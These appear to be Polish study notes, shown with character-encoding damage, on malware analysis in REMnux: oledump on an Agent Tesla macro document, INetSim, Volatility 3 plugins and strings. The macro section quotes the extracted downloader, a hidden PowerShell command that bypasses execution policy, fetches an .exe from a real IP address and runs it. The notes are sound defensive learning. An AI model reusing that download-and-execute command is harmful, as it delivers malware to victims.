ğŸ“Œ REMnux â€“ analiza zÅ‚oÅ›liwego oprogramowania
1ï¸âƒ£ Czym jest REMnux?
REMnux to specjalna dystrybucja Linuxa przeznaczona do:
analizy malware
analizy dokumentÃ³w z makrami
analizy pamiÄ™ci RAM
symulowania sieci
Zawiera gotowe narzÄ™dzia:
Volatility
YARA
Wireshark
oledump
INetSim
i wiele innych
ğŸ‘‰ To bezpieczne Å›rodowisko (sandbox) do badania podejrzanych plikÃ³w.

ğŸ“‚ Statyczna analiza dokumentu â€“ oledump.py
Co analizowaliÅ›my?
Plik: agenttesla.xlsm
To dokument Excel z makrami (.xlsm).

ğŸ” Krok 1 â€“ Sprawdzenie zawartoÅ›ci pliku
oledump.py agenttesla.xlsm
Wynik pokazuje tzw. data streams.
NajwaÅ¼niejsze:
A4: M 688 'VBA/ThisWorkbook'
ğŸ“Œ Litera M oznacza, Å¼e w strumieniu jest Macro (VBA).

ğŸ” Krok 2 â€“ WyciÄ…gniÄ™cie konkretnego strumienia
oledump.py agenttesla.xlsm -s 4
-s = select (wybÃ³r strumienia)
4 = numer strumienia (A4)
Wynik jest w HEX â†’ maÅ‚o czytelny.

ğŸ” Krok 3 â€“ Dekompresja VBA
oledump.py agenttesla.xlsm -s 4 --vbadecompress
Teraz makro jest czytelne.
ğŸ§  Co robiÅ‚o makro?
Makro uruchamiaÅ‚o PowerShell:
powershell -WindowStyle hidden -executionpolicy bypass;
Invoke-WebRequest -Uri "http://193.203.203.67/rt/Doc-3737122pdf.exe"
-OutFile $TempFile;
Start-Process $TempFile;

ğŸ”¥ Co to oznacza?
-WindowStyle hidden
â†’ PowerShell dziaÅ‚a w ukrytym oknie
-executionpolicy bypass
â†’ omija zabezpieczenia PowerShell
Invoke-WebRequest
â†’ pobiera plik z internetu
Start-Process
â†’ uruchamia pobrany plik

ğŸ“Œ Podsumowanie ataku
Po otwarciu dokumentu:
Uruchamia siÄ™ makro
Makro odpala PowerShell
PowerShell pobiera plik .exe
Plik zostaje uruchomiony
ğŸ¯ Typowa technika malware â€“ downloader.
ğŸŒ INetSim â€“ symulowanie faÅ‚szywej sieci
INetSim pozwala symulowaÄ‡:
HTTP
HTTPS
DNS
FTP
SMTP
itd.
Czyli tworzymy faÅ‚szywy internet dla malware.

ğŸ”§ Konfiguracja
1ï¸âƒ£ SprawdÅº IP maszyny:
ifconfig
2ï¸âƒ£ Edytuj konfiguracjÄ™:
sudo nano /etc/inetsim/inetsim.conf
ZnajdÅº:
#dns_default_ip 0.0.0.0
UsuÅ„ # i wpisz IP maszyny.
3ï¸âƒ£ Uruchom:
sudo inetsim
JeÅ›li widzisz:
Simulation running
â†’ dziaÅ‚a âœ…
ğŸ–¥ï¸ Test z AttackBox
Z AttackBox:
sudo wget https://MACHINE_IP/second_payload.zip --no-check-certificate
Pliki sÄ… FAKE â€“ generowane przez INetSim.
ğŸ“„ Logi po zakoÅ„czeniu
Po zatrzymaniu INetSim:
sudo cat /var/log/inetsim/report/report.X.txt
Zobaczysz:
metodÄ™ (GET)
URL
protokÃ³Å‚
jaki plik zostaÅ‚ â€pobranyâ€
ğŸ“Œ To symuluje zachowanie malware.

ğŸ§  Volatility 3 â€“ analiza pamiÄ™ci RAM
Plik: wcry.mem
Podstawowa skÅ‚adnia:
vol3 -f wcry.mem windows.nazwapluginu
NajwaÅ¼niejsze pluginy

ğŸŒ³ PsTree
Pokazuje procesy w formie drzewa (rodzic â†’ dziecko)
windows.pstree.PsTree

ğŸ“‹ PsList
Lista aktywnych procesÃ³w
windows.pslist.PsList

ğŸ’¬ CmdLine
Pokazuje argumenty uruchomienia procesÃ³w
windows.cmdline.CmdLine

ğŸ“ FileScan
Skanuje obiekty plikÃ³w w pamiÄ™ci
windows.filescan.FileScan

ğŸ“š DllList
Lista zaÅ‚adowanych bibliotek DLL
windows.dlllist.DllList

ğŸ” PsScan
Wyszukuje procesy (nawet ukryte)
windows.psscan.PsScan

ğŸ’€ Malfind
Wykrywa moÅ¼liwy wstrzykniÄ™ty kod (code injection)
windows.malfind.Malfind

ğŸ” Automatyzacja â€“ preprocessing
Zamiast rÄ™cznie uruchamiaÄ‡ pluginy:
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done

ğŸ“Œ Co robi?
Tworzy pÄ™tlÄ™
Uruchamia kaÅ¼dy plugin
Zapisuje wynik do osobnego pliku .txt
To jest profesjonalna praktyka forensic.

ğŸ”¤ Preprocessing za pomocÄ… strings
strings wcry.mem > wcry.strings.ascii.txt
strings -e l wcry.mem > wcry.strings.unicode_little_endian.txt
strings -e b wcry.mem > wcry.strings.unicode_big_endian.txt

Opcje:
-e l â†’ Unicode little endian
-e b â†’ Unicode big endian

ğŸ“Œ Po co?
Aby Å‚atwiej wyszukiwaÄ‡:
adresy IP
domeny
hasÅ‚a
Å›cieÅ¼ki plikÃ³w

ğŸ¯ Co zapamiÄ™taÄ‡ z caÅ‚ego rooma?
âœ” REMnux = gotowe Å›rodowisko do malware analysis
âœ” oledump â†’ analiza dokumentÃ³w z makrami
âœ” Makra czÄ™sto uruchamiajÄ… PowerShell downloader
âœ” INetSim â†’ symuluje internet dla malware
âœ” Volatility â†’ analiza pamiÄ™ci RAM
âœ” Strings â†’ szybkie wydobywanie tekstu z pamiÄ™ci
âœ” Preprocessing = zapis wynikÃ³w do plikÃ³w

ğŸ’€ NajwaÅ¼niejsza lekcja praktyczna
Threat actorzy:
uÅ¼ywajÄ… makr
ukrywajÄ… PowerShell
omijajÄ… execution policy
pobierajÄ… drugi payload
czÄ™sto stosujÄ… wieloetapowy atak
